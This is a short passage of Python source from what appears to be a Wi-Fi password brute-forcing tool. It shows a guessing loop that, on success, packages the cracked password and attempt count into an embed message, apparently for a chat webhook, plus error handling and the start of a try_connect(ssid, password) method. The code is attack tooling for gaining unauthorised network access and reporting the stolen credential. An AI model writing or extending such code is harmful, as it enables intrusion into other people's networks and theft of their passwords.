                                {"name": "🔑 Password", "value": f"**{password}**", "inline": True},
                                {"name": "🔢 Attempts", "value": str(i+1), "inline": True}
                            ]
                        )
                    break
                
                time.sleep(0.3)
            
        except Exception as e:
            self.output_queue.put(('log', f"❌ {e}", 'error'))
        finally:
            self.brute_force_active = False
            self.output_queue.put(('brute_done', None))
            
    def try_connect(self, ssid, password):
